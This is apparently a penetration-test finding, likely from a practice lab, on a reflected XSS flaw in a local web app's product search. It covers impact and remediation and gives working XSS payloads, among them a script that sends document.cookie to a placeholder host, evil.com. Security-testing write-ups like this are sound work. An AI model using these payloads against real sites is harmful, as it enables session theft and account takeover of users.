
**Category:**  #a3_injection
## Finding  
The **product search functionality** is vulnerable to **reflected Cross-Site Scripting (XSS)**. User-supplied input is not sanitized or encoded before being reflected back into the HTML response. This allows attackers to inject arbitrary JavaScript code.  

### Proof of Concept (PoC) Payload  
```html
<iframe src="javascript:alert('XSS')">
```

When this payload is submitted through the search field, it is executed by the browser, showing that JavaScript injection is possible.  
![Pasted image 20250907154833](Pasted%20image%2020250907154833.png)
## Impact  
- **Account compromise**: An attacker could steal session cookies or JWT tokens.  
- **Phishing**: The attacker could craft malicious pop-ups or redirects to steal user credentials.  
- **Privilege escalation**: If an admin user is targeted, the attacker may gain administrative access.  
- **Defacement**: Injected scripts could modify the appearance of the application.  
**Severity:** **High**
## Attack Scenarios  
1. An attacker embeds a malicious payload into a search URL and tricks a victim into clicking it.  
   Example:  
   ``http://localhost:3000/#/search?q=<iframe src=javascript:alert('lol')>``  

2. More advanced payloads could exfiltrate cookies or data:  
   ``<script>fetch('https://evil.com/steal?c='+document.cookie)</script>``  

3. With the lack of a strict Content-Security-Policy (CSP), the attacker can load external scripts, leading to **full takeover of the victim’s session**.  

## Recommendation  
- **Input Validation**: Reject unexpected characters and apply a whitelist approach to input fields.  
- **Output Encoding**: Encode all user input before rendering in the DOM (e.g., `&lt;` for `<`).  
- **Content Security Policy (CSP)**: Apply a strict CSP that disallows inline scripts and restricts sources.  
- **Testing**: Regularly test with automated tools (e.g., OWASP ZAP, Burp Suite) and manual payloads.  

